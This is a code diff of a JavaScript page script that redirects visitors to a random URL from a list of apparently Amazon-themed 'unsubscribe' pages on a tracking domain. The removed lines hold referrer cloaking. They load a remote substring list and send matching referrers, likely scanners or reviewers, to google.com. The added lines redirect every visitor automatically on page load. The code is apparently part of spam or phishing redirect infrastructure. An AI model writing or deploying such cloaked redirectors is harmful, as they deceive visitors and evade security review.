@@ -1,6 +1,3 @@
-// Static redirect URL for all matching substrings
-const staticRedirectUrl = "https://www.google.com";
-
 // List of URLs
 const urls = [
     "https://server-tracking.eu/amz/unsubscribe-012024-01.html",
@@ -25,19 +22,8 @@ const urls = [
     "https://server-tracking.eu/amz/unsubscribe-112024-01.html"
 ];
 
-// Function to handle redirection
-function redirectToRandomUrl(substrings) {
-    const referrer = document.referrer;
-    console.log('Referrer:', referrer);  // Print the referrer for debugging
-
-    // Check if the referrer contains any of the substrings
-    if (substrings.some(substring => referrer.includes(substring))) {
-        console.log(`Redirecting visitor from referrer ${referrer} to ${staticRedirectUrl}`);
-        window.location.href = staticRedirectUrl;
-        return;
-    }
-
-    // Redirect to a random URL if no substring match
+// Function to select a random URL and redirect
+function redirectToRandomUrl() {
     if (!urls || urls.length === 0) {
         console.error("No URLs available for redirection.");
         return;
@@ -47,27 +33,10 @@ function redirectToRandomUrl(substrings) {
     const randomUrl = urls[randomIndex];
 
     console.log(`Redirecting to: ${randomUrl}`);
+    
+    // Redirect to the random URL
     window.location.href = randomUrl;
 }
 
-// Load substrings from JSON file and execute redirection
-fetch('https://hellonetwork2023.github.io/sc/substrings.json')
-    .then(response => {
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        return response.json();
-    })
-    .then(data => {
-        const substrings = data.substrings || [];
-        console.log('Loaded substrings:', substrings);
-
-        // Execute the redirection logic with loaded substrings
-        redirectToRandomUrl(substrings);
-    })
-    .catch(error => {
-        console.error('Error loading substrings:', error);
-
-        // Fallback to random redirection if substrings fail to load
-        redirectToRandomUrl([]);
-    });
+// Execute redirection on page load
+window.onload = redirectToRandomUrl;
